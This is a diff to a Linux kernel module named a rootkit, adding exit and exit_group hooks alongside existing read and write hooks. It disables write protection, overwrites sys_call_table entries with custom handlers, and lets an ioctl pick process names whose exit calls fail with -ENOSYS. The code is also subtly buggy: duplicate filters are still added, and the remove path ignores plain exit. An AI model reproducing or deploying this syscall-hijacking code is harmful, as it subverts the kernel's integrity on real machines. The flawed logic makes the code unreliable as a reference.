@@ -60,10 +60,14 @@ static struct list_head *stored_list = NULL;
 //asmlinkage long (*original_write)(unsigned int, const char __user *, size_t);
 static sys_call_t original_read;
 static sys_call_t original_write;
+static sys_call_t original_exit;
+static sys_call_t original_exit_group;
 
-// My custom read and write
+// My custom read, write and exit (exit group)
 static asmlinkage long my_read(const struct pt_regs *regs);
 static asmlinkage long my_write(const struct pt_regs *regs);
+static asmlinkage long my_exit(const struct pt_regs *regs);
+static asmlinkage long my_exit_group(const struct pt_regs *regs);
 
 // filtered read process
 struct dynamic_array{
@@ -75,6 +79,8 @@ struct dynamic_array{
 
 struct dynamic_array read_filtered_processes;
 struct dynamic_array write_filtered_processes;
+struct dynamic_array exit_filtered_processes;
+struct dynamic_array exit_group_filtered_processes;
 
 
 // For opening read only memory to writable
@@ -159,10 +165,17 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
         break;
     case IOCTL_ADD_FILTER:
         // Copy the filter info into kernel space memory
+        //
+        /*
+         * Reference:
+         * 1. https://blog.csdn.net/weixin_45030965/article/details/129203081
+         * 2. https://blog.csdn.net/u013250169/article/details/114374228
+         */
         copy_from_user(&passing_infos, (struct filter_info *)arg, sizeof(passing_infos));
 
-        // Check if syscall_nr = read or write
-        if(passing_infos.syscall_nr != __NR_read && passing_infos.syscall_nr != __NR_write)
+        // Check if syscall_nr = read or write or exit (exit group)
+        if(passing_infos.syscall_nr != __NR_read && passing_infos.syscall_nr != __NR_write 
+                && passing_infos.syscall_nr != __NR_exit && passing_infos.syscall_nr != __NR_exit_group)
         {
             printk("The passing syscall_nr does not support custom filtering.");
             break;
@@ -191,6 +204,28 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
                 }
             }
         }
+        if(passing_infos.syscall_nr == __NR_exit)
+        {
+            for(int i=0;i<exit_filtered_processes.len;i++)
+            {
+                if(strcmp(passing_infos.comm, exit_filtered_processes.comm[i])==0)
+                {
+                    printk("This process has already been filtered.");
+                    break;
+                }
+            }
+        }
+        if(passing_infos.syscall_nr == __NR_exit_group)
+        {
+            for(int i=0;i<exit_group_filtered_processes.len;i++)
+            {
+                if(strcmp(passing_infos.comm, exit_group_filtered_processes.comm[i])==0)
+                {
+                    printk("This process has already been filtered.");
+                    break;
+                }
+            }
+        }
 
         // Check if the filter list is full (Probably non-happen)
         if(passing_infos.syscall_nr == __NR_read && read_filtered_processes.len + 1 >= NUM_MAX_FILTERED_PROCESS)
@@ -201,6 +236,16 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
         if(passing_infos.syscall_nr == __NR_write && write_filtered_processes.len + 1 >= NUM_MAX_FILTERED_PROCESS)
         {
             printk("Filtered list for write is full. Cannot add anything.");
+            break;
+        }
+        if(passing_infos.syscall_nr == __NR_exit && exit_filtered_processes.len + 1 >= NUM_MAX_FILTERED_PROCESS)
+        {
+            printk("Filtered list for exit is full. Cannot add anything.");
+            break;
+        }
+        if(passing_infos.syscall_nr == __NR_exit_group && exit_group_filtered_processes.len + 1 >= NUM_MAX_FILTERED_PROCESS)
+        {
+            printk("Filtered list for exit group is full. Cannot add anything.");
             break;
         }
         
@@ -227,16 +272,37 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
             strcpy(write_filtered_processes.comm[write_filtered_processes.len], passing_infos.comm);
             write_filtered_processes.len++;
         }
-
-
+        if(passing_infos.syscall_nr == __NR_exit)
+        {
+            if(exit_filtered_processes.len+1 > exit_filtered_processes.size)
+            {
+                exit_filtered_processes.comm[exit_filtered_processes.len] = 
+                    (char *)kmalloc(sizeof(char) * TASK_FILTER_LEN, GFP_KERNEL);
+                exit_filtered_processes.size++;
+            }
+            strcpy(exit_filtered_processes.comm[exit_filtered_processes.len], passing_infos.comm);
+            exit_filtered_processes.len++;
+        }
+        if(passing_infos.syscall_nr == __NR_exit_group)
+        {
+            if(exit_group_filtered_processes.len+1 > exit_group_filtered_processes.size)
+            {
+                exit_group_filtered_processes.comm[exit_group_filtered_processes.len] = 
+                    (char *)kmalloc(sizeof(char) * TASK_FILTER_LEN, GFP_KERNEL);
+                exit_group_filtered_processes.size++;
+            }
+            strcpy(exit_group_filtered_processes.comm[exit_group_filtered_processes.len], passing_infos.comm);
+            exit_group_filtered_processes.len++;
+        }
         break;
     case IOCTL_REMOVE_FILTER:
         int visit = 0;
         // Copy the filter info into kernel space memory
         copy_from_user(&passing_infos, (struct filter_info *)arg, sizeof(passing_infos));
 
-        // Check if syscall_nr = read or write
-        if(passing_infos.syscall_nr != __NR_read && passing_infos.syscall_nr != __NR_write)
+        // Check if syscall_nr = read or write or exit (exit group)
+        if(passing_infos.syscall_nr != __NR_read && passing_infos.syscall_nr != __NR_write 
+                && passing_infos.syscall_nr != __NR_exit && passing_infos.syscall_nr != __NR_exit_group)
         {
             printk("The passing syscall_nr does not support custom filtering.");
             break;
@@ -260,6 +326,15 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
                 else if(strcmp(passing_infos.comm, write_filtered_processes.comm[i])==0) visit = 1;
             }
             if(visit) write_filtered_processes.len--;
+        }
+        if(passing_infos.syscall_nr == __NR_exit_group)
+        {
+            for(int i=0;i<exit_group_filtered_processes.len;i++)
+            {
+                if(visit) strcpy(exit_group_filtered_processes.comm[i-1], exit_group_filtered_processes.comm[i]);
+                else if(strcmp(passing_infos.comm, exit_group_filtered_processes.comm[i])==0) visit = 1;
+            }
+            if(visit) exit_group_filtered_processes.len--;
         }
         break;
     default:
@@ -315,6 +390,8 @@ static int __init rootkit_init(void) {
     // Allocate the list for filtering read and write
     read_filtered_processes.comm  = (char **)kmalloc(sizeof(char *)*NUM_MAX_FILTERED_PROCESS, GFP_KERNEL);
     write_filtered_processes.comm = (char **)kmalloc(sizeof(char *)*NUM_MAX_FILTERED_PROCESS, GFP_KERNEL);
+    exit_filtered_processes.comm = (char **)kmalloc(sizeof(char *)*NUM_MAX_FILTERED_PROCESS, GFP_KERNEL);
+    exit_group_filtered_processes.comm = (char **)kmalloc(sizeof(char *)*NUM_MAX_FILTERED_PROCESS, GFP_KERNEL);
 
     // Get some hidden variables via kallsyms_lookup_name 
     __sys_call_table = (unsigned long *)kallsyms_lookup_name_func("sys_call_table");
@@ -326,12 +403,15 @@ static int __init rootkit_init(void) {
     // Store the original syscall
     original_read = (sys_call_t)__sys_call_table[__NR_read];
     original_write = (sys_call_t)__sys_call_table[__NR_write];
-    printk("Hello!!!!!!");
+    original_exit = (sys_call_t)__sys_call_table[__NR_exit];
+    original_exit_group = (sys_call_t)__sys_call_table[__NR_exit_group];
 
     // Change to my custom filtered function
     open_memory();
     __sys_call_table[__NR_read] = (unsigned long)my_read;
     __sys_call_table[__NR_write] = (unsigned long)my_write;
+    __sys_call_table[__NR_exit] = (unsigned long)my_exit;
+    __sys_call_table[__NR_exit_group] = (unsigned long)my_exit_group;
     protect_memory();
 
     return 0;
@@ -345,6 +425,8 @@ static void __exit rootkit_exit(void) {
     open_memory();
     __sys_call_table[__NR_read]  = (unsigned long)original_read;
     __sys_call_table[__NR_write] = (unsigned long)original_write;
+    __sys_call_table[__NR_exit] = (unsigned long)original_exit;
+    __sys_call_table[__NR_exit_group] = (unsigned long)original_exit_group;
     protect_memory();
     ///////////////////////////////////////
 
@@ -378,4 +460,26 @@ static asmlinkage long my_write(const struct pt_regs *regs)
         }
     }
     return original_write(regs);
+}
+static asmlinkage long my_exit(const struct pt_regs *regs)
+{
+    for(int i=0; i<exit_filtered_processes.len; i++)
+    {
+        if(strcmp(exit_filtered_processes.comm[i], current->comm) == 0)
+        {
+            return -ENOSYS;
+        }
+    }
+    return original_exit(regs);
+}
+static asmlinkage long my_exit_group(const struct pt_regs *regs)
+{
+    for(int i=0; i<exit_group_filtered_processes.len; i++)
+    {
+        if(strcmp(exit_group_filtered_processes.comm[i], current->comm) == 0)
+        {
+            return -ENOSYS;
+        }
+    }
+    return original_exit_group(regs);
 }
